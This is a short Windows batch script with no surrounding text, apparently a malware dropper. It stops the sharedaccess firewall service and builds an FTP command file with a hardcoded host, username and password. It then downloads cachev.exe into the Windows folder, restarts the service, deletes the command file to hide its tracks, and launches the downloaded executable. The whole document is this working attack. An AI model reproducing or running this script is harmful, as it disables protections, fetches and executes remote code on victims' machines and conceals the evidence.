sc stop sharedaccess
echo open www.dsgj55ffa.com 21>>C:\WINDOWS\cd.dat
echo 5565844>>C:\WINDOWS\cd.dat
echo zhenhao888>>C:\WINDOWS\cd.dat
echo cd wwwroot>>C:\WINDOWS\cd.dat
echo binary>>C:\WINDOWS\cd.dat
echo get cachev.exe C:\WINDOWS\cachev.exe>>C:\WINDOWS\cd.dat
echo bye>>C:\WINDOWS\cd.dat
ftp -s:C:\WINDOWS\cd.dat
sc start sharedaccess
del C:\WINDOWS\cd.dat
start C:\WINDOWS\cachev.exe
exit

